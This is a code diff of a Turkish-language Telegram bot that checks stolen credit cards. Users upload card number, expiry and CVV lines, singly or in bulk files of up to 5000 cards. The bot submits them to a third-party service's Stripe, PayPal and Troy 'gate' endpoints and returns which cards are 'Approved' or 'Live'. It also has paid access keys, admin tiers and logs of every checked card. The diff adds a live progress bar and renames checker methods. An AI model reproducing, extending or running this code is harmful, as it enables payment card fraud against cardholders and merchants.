@@ -1,5 +1,5 @@
-# --- DOSYA: main.py (v36 - Beş Silahşörler Ordusu) ---
-# apiservicee.store'dan gelen 5 yeni API sisteme entegre edildi.
+# --- DOSYA: main.py (v37 - FİNAL İMPARATORLUK ORDUSU) ---
+# Canlı Telsiz (Sayaç) özelliği geri eklendi. Bütün sistemler aktif.
 
 import logging, requests, time, os, re, json, io
 from urllib.parse import quote
@@ -26,7 +26,7 @@ except ImportError:
     print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()
 
 # -----------------------------------------------------------------------------
-# 3. BİRİM: İSTİHBARAT & OPERASYON (YENİ ÇOKLU SİLAH SİSTEMİ)
+# 3. BİRİM: İSTİHBARAT & OPERASYON (BEŞ SİLAHŞÖRLER)
 # -----------------------------------------------------------------------------
 class ApiServiceChecker:
     def __init__(self, key):
@@ -37,9 +37,7 @@ class ApiServiceChecker:
         self.timeout = 30
 
     def login(self) -> bool:
-        """Anahtarla apiservicee.store'a giriş yapar."""
         try:
-            # Plandan öğrendiğimiz gibi, keydogrulama.php'ye istek atıyoruz.
             login_url = f"{self.base_url}keydogrulama.php?key={self.key}"
             response = self.session.get(login_url, timeout=self.timeout)
             data = response.json()
@@ -53,18 +51,14 @@ class ApiServiceChecker:
             logging.error(f"ApiServiceChecker giriş hatası: {e}"); return False
 
     def _check(self, gateway, card):
-        """Belirtilen gateway için ortak check fonksiyonu."""
         try:
             endpoint = f"{self.base_url}gate/{gateway}.php"
-            # tumkartv2 GET, diğerleri POST kullanıyor.
             if gateway == 'tumkart2':
                 full_url = f"{endpoint}?key={self.key}&lista={quote(card)}"
                 response = self.session.get(full_url, timeout=self.timeout)
             else:
                 form_data = {'lista': card, 'key': self.key}
                 response = self.session.post(endpoint, data=form_data, timeout=self.timeout)
-
-            # Gelen cevabı yorumla
             result_text = response.text.strip()
             if "approved" in result_text.lower() or "live" in result_text.lower() or "✅" in result_text:
                 return f"✅ Approved - {result_text}"
@@ -74,16 +68,15 @@ class ApiServiceChecker:
             return f"❌ HATA ({gateway}): {e}"
 
     def check_tumkartv2(self, card): return self._check('tumkart2', card)
-    def check_stripe_auth(self, card): return self._check('tumkart', card) # Dosya adı tumkart.php
+    def check_stripeauth(self, card): return self._check('tumkart', card)
     def check_troy(self, card): return self._check('troy', card)
     def check_paypal(self, card): return self._check('paypal', card)
-    def check_stripe_charge(self, card): return self._check('stripe', card)
+    def check_stripecharge(self, card): return self._check('stripe', card)
 
 # -----------------------------------------------------------------------------
 # 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
 # -----------------------------------------------------------------------------
 class UserManager:
-    # ... (Bu class'ta değişiklik yok) ...
     def __init__(self, initial_admin_id):
         self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
         self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
@@ -127,20 +120,34 @@ def log_activity(user: User, card: str, result: str):
     with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)
 
 async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
-    job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
+    job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']
+    cards = job_data['cards']; progress_message_id = job_data['progress_message_id']
     checker_method_name = job_data['checker_method']
+    total_cards = len(cards)
     site_checker: ApiServiceChecker = context.bot_data['api_service_checker']
-    
-    # Doğru check metodunu çağırmak için getattr kullanıyoruz
     check_function = getattr(site_checker, checker_method_name)
-
-    await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
-    report_content = ""
-    for card in cards:
-        result = check_function(card); log_activity(user, card, result)
-        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1) # API'yi yormamak için 1 saniye bekle
+    report_content = ""; last_update_time = time.time()
+    try:
+        for i, card in enumerate(cards):
+            result = check_function(card); log_activity(user, card, result)
+            report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1)
+            current_time = time.time()
+            if (i + 1) % 5 == 0 or current_time - last_update_time > 3:
+                progress = i + 1
+                progress_percent = int((progress / total_cards) * 10)
+                progress_bar = '█' * progress_percent + '─' * (10 - progress_percent)
+                progress_text = f"<code>[{progress_bar}]</code>\n\n<b>Taranıyor:</b> {progress} / {total_cards}"
+                try:
+                    await context.bot.edit_message_text(text=progress_text, chat_id=user_id, message_id=progress_message_id, parse_mode=ParseMode.HTML)
+                    last_update_time = current_time
+                except BadRequest as e:
+                    if "Message is not modified" not in str(e): logging.warning(f"Durum raporu güncellenemedi: {e}")
+    except Exception as e:
+        logging.error(f"Toplu check sırasında hata: {e}")
+        await context.bot.edit_message_text(chat_id=user_id, message_id=progress_message_id, text=f"❌ Komutanım, operasyon sırasında bir hata oluştu: {e}"); return
+    await context.bot.edit_message_text(text=f"✅ Tarama bitti! Rapor hazırlanıp yollanıyor...", chat_id=user_id, message_id=progress_message_id)
     report_file = io.BytesIO(report_content.encode('utf-8'))
-    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")
+    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption=f"Operasyon tamamlandı. {total_cards} kartlık raporun ektedir.")
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
@@ -152,30 +159,27 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))
 
 def checker_command_factory(method_name, display_name):
-    """Farklı checker komutları için handler üreten fabrika."""
     async def command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_manager: UserManager = context.bot_data['user_manager']
         if not user_manager.is_user_activated(update.effective_user.id):
             await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
-        
         context.user_data['checker_method'] = method_name
         keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
         await update.message.reply_text(f"**{display_name}** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
     return command_handler
 
-# ... (Diğer handler'lar aynı) ...
-async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
+async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']; key = context.args[0] if context.args else None
     if not key: await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`"); return
     result = user_manager.activate_admin(update.effective_user.id, key)
     if result == "Success": await update.message.reply_text("✅ Ferman kabul edildi! Artık Komuta Kademesindesin.")
     else: await update.message.reply_text(f"❌ {result}")
-async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
+async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
     if os.path.exists("terminator_logs.txt"): await update.message.reply_document(document=open("terminator_logs.txt", 'rb'), caption="İstihbarat raporu.")
     else: await update.message.reply_text("Henüz toplanmış bir istihbarat yok.")
-async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
+async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
     if not context.args: await update.message.reply_text("Kullanım: `/duyuru Mesajınız`"); return
@@ -187,15 +191,19 @@ async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # 
         try: await context.bot.send_message(chat_id=int(user_id), text=f"📣 **Komuta Kademesinden Ferman Var:**\n\n{duyuru_mesaji}"); success += 1
         except Exception: fail += 1; time.sleep(0.1)
     await update.message.reply_text(f"✅ Ferman operasyonu tamamlandı!\nBaşarıyla gönderildi: {success}\nBaşarısız: {fail}")
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
-    query = update.callback_query; await query.answer(); action = query.data
-    if action == "activate_start": context.user_data['awaiting_key'] = True; await query.edit_message_text(text="🔑 Lütfen sana verilen anahtarı şimdi gönder.")
-    elif action == "activate_no_key": await query.edit_message_text(text="Key almak için @tanriymisimben e başvurabilirsin.")
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer(); action = query.data; new_text = None
+    if action == "activate_start": context.user_data['awaiting_key'] = True; new_text = "🔑 Lütfen sana verilen anahtarı şimdi gönder."
+    elif action == "activate_no_key": new_text = "Key almak için @Farkederli e başvurabilirsin."
     elif action.startswith("mode_"):
         mode = action.split('_')[1]; context.user_data['mode'] = mode
-        if mode == 'single': await query.edit_message_text(text="✅ **Tekli Mod** seçildi.\nŞimdi bir adet kart yolla.")
+        if mode == 'single': new_text = "✅ **Tekli Mod** seçildi.\nŞimdi bir adet kart yolla."
         elif mode == 'multiple':
-            context.user_data['awaiting_bulk_file'] = True; await query.edit_message_text(text="✅ **Çoklu Mod** seçildi.\nŞimdi içinde kartların olduğu `.txt` dosyasını gönder.")
+            context.user_data['awaiting_bulk_file'] = True; new_text = "✅ **Çoklu Mod** seçildi.\nŞimdi içinde kartların olduğu `.txt` dosyasını gönder."
+    if new_text:
+        try: await query.edit_message_text(text=new_text, parse_mode=ParseMode.MARKDOWN)
+        except BadRequest as e:
+            if "Message is not modified" not in str(e): logging.warning(f"Button callback hatası: {e}")
 async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if context.user_data.get('awaiting_key', False):
@@ -220,21 +228,21 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_activated(update.effective_user.id): return
     if not context.user_data.get('awaiting_bulk_file') or 'checker_method' not in context.user_data: return
-    await update.message.reply_text("Dosya alındı, askeri konvoy indiriliyor...")
+    progress_message = await update.message.reply_text("Dosya alındı... Hedefler kilitleniyor...")
     try:
         file = await context.bot.get_file(update.message.document); file_content_bytes = await file.download_as_bytearray()
         file_content = file_content_bytes.decode('utf-8')
-    except Exception as e: await update.message.reply_text(f"Dosyayı okurken bir hata oldu: {e}"); return
+    except Exception as e: await progress_message.edit_text(f"Dosyayı okurken bir hata oldu: {e}"); return
     cards = [];
     for line in file_content.splitlines():
         if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', line.strip()): cards.append(line.strip())
-    if not cards: await update.message.reply_text("Dosyanın içinde geçerli formatta kart bulamadım."); return
+    if not cards: await progress_message.edit_text("Dosyanın içinde geçerli formatta kart bulamadım."); return
     is_admin = user_manager.is_user_admin(update.effective_user.id); limit = 5000 if is_admin else 120
     if len(cards) > limit:
-        await update.message.reply_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
-    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards, 'checker_method': context.user_data['checker_method']}
-    context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")
-    await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı...")
+        await progress_message.edit_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
+    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards, 'checker_method': context.user_data['checker_method'], 'progress_message_id': progress_message.message_id}
+    context.job_queue.run_once(bulk_check_job, 1, data=job_data, name=f"check_{update.effective_user.id}")
+    await progress_message.edit_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı. Canlı telsiz bağlantısı kuruldu.")
     context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None); context.user_data.pop('checker_method', None)
 
 # -----------------------------------------------------------------------------
@@ -248,7 +256,7 @@ def main():
     if not api_service_checker.login(): print("UYARI: ApiServiceChecker'a giriş yapılamadı!")
     else: print("ApiServiceChecker birimi aktif.")
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Lordlar Kulübü (v36 - Beş Silahşörler) aktif...")
+    print("Lordlar Kulübü (v37 - İmparatorluk) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.bot_data['api_service_checker'] = api_service_checker
     application.bot_data['user_manager'] = user_manager_instance
@@ -256,10 +264,10 @@ def main():
     # Bütün komutları ekle
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("tumkartv2", checker_command_factory('check_tumkartv2', 'Tüm Kart V2')))
-    application.add_handler(CommandHandler("stripeauth", checker_command_factory('check_stripe_auth', 'Stripe Auth')))
+    application.add_handler(CommandHandler("stripeauth", checker_command_factory('check_stripeauth', 'Stripe Auth')))
     application.add_handler(CommandHandler("troy", checker_command_factory('check_troy', 'Troy')))
     application.add_handler(CommandHandler("paypal", checker_command_factory('check_paypal', 'PayPal')))
-    application.add_handler(CommandHandler("stripecharge", checker_command_factory('check_stripe_charge', 'Stripe Charge')))
+    application.add_handler(CommandHandler("stripecharge", checker_command_factory('check_stripecharge', 'Stripe Charge')))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("logs", logs_command))
     application.add_handler(CommandHandler("duyuru", duyuru_command))
